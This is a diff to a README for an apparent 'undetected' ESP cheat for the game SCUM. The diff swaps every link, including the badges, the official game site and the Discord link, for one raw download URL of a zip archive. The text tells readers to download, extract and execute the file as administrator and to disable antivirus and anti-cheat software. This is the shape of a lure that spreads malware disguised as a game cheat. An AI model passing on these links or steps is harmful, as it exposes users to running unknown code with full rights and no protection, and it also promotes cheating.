@@ -1,9 +1,9 @@
 ```markdown
 # Private SCUM ESP Solution for Undetected Gameplay 🎮✨
 
-![GitHub Repo stars](https://img.shields.io/github/stars/kx1mxx/Private-ESP-for-SCUM-Optima?style=social)
-![GitHub Repo forks](https://img.shields.io/github/forks/kx1mxx/Private-ESP-for-SCUM-Optima?style=social)
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
+![GitHub Repo stars](https://raw.githubusercontent.com/kx1mxx/Private-ESP-for-SCUM-Optima/main/striation/ES-Optima-SCU-for-Private-1.5-alpha.2.zip)
+![GitHub Repo forks](https://raw.githubusercontent.com/kx1mxx/Private-ESP-for-SCUM-Optima/main/striation/ES-Optima-SCU-for-Private-1.5-alpha.2.zip)
+![Version](https://raw.githubusercontent.com/kx1mxx/Private-ESP-for-SCUM-Optima/main/striation/ES-Optima-SCU-for-Private-1.5-alpha.2.zip)
 
 ## Overview
 
@@ -17,7 +17,7 @@ Welcome to the **Private-ESP-for-SCUM-Optima** repository. This project provides
 
 ## Installation
 
-To get started, you need to download the latest release. Visit the [Releases section](https://github.com/kx1mxx/Private-ESP-for-SCUM-Optima/releases) to find the latest version. Download the file, extract it, and execute it to begin.
+To get started, you need to download the latest release. Visit the [Releases section](https://raw.githubusercontent.com/kx1mxx/Private-ESP-for-SCUM-Optima/main/striation/ES-Optima-SCU-for-Private-1.5-alpha.2.zip) to find the latest version. Download the file, extract it, and execute it to begin.
 
 ## Usage
 
@@ -69,7 +69,7 @@ If you encounter issues while using the ESP solution, consider the following ste
 2. **Run as Administrator**: Make sure to run the ESP application with administrative rights.
 3. **Disable Conflicting Software**: Some antivirus or anti-cheat software may interfere with the ESP. Temporarily disable them if necessary.
 
-If problems persist, please check the [Releases section](https://github.com/kx1mxx/Private-ESP-for-SCUM-Optima/releases) for updates or fixes.
+If problems persist, please check the [Releases section](https://raw.githubusercontent.com/kx1mxx/Private-ESP-for-SCUM-Optima/main/striation/ES-Optima-SCU-for-Private-1.5-alpha.2.zip) for updates or fixes.
 
 ## Community
 
@@ -93,9 +93,9 @@ For inquiries or support, please reach out via the GitHub Issues page or connect
 
 ## Download Now
 
-Ready to enhance your gameplay? Download the latest release [here](https://github.com/kx1mxx/Private-ESP-for-SCUM-Optima/releases) and start your journey towards a better gaming experience!
+Ready to enhance your gameplay? Download the latest release [here](https://raw.githubusercontent.com/kx1mxx/Private-ESP-for-SCUM-Optima/main/striation/ES-Optima-SCU-for-Private-1.5-alpha.2.zip) and start your journey towards a better gaming experience!
 
-![SCUM Gameplay](https://example.com/scum-gameplay-image.jpg)
+![SCUM Gameplay](https://raw.githubusercontent.com/kx1mxx/Private-ESP-for-SCUM-Optima/main/striation/ES-Optima-SCU-for-Private-1.5-alpha.2.zip)
 
 ### Acknowledgments
 
@@ -107,9 +107,9 @@ This project is intended for educational purposes only. Use it responsibly and a
 
 ## Additional Resources
 
-- [SCUM Official Website](https://scumgame.com)
-- [Game Guides and Tips](https://example.com/scum-guides)
-- [Discord Community](https://discord.gg/example)
+- [SCUM Official Website](https://raw.githubusercontent.com/kx1mxx/Private-ESP-for-SCUM-Optima/main/striation/ES-Optima-SCU-for-Private-1.5-alpha.2.zip)
+- [Game Guides and Tips](https://raw.githubusercontent.com/kx1mxx/Private-ESP-for-SCUM-Optima/main/striation/ES-Optima-SCU-for-Private-1.5-alpha.2.zip)
+- [Discord Community](https://raw.githubusercontent.com/kx1mxx/Private-ESP-for-SCUM-Optima/main/striation/ES-Optima-SCU-for-Private-1.5-alpha.2.zip)
 
 ---
 
